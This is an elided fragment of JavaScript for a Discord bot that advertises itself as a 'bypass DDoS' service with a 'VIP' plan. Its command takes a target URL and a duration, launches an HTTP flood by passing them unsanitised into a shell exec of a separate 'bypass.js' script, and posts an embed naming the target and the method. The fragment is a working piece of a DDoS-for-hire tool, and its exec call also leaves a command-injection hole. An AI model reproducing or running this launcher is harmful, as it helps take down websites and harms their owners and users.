...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;HTTP-DITNHAU https://example.com/ 60`")
...
exec(`node bypass.js ${host} ]${duration}`, (error, stdout, stderr) => {
});
...
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('💀 **ARELLA BOT BYPASS DDoS** 💀')
	.setTimestamp()
  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 🎃` \n **𝐓𝐚𝐫𝐠𝐞𝐭** : `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝𝐬** : `𝐇𝐓𝐓𝐏-DITNHAU 👽` \n **𝐓𝐈𝐌𝐄** : `" + duration + "`")
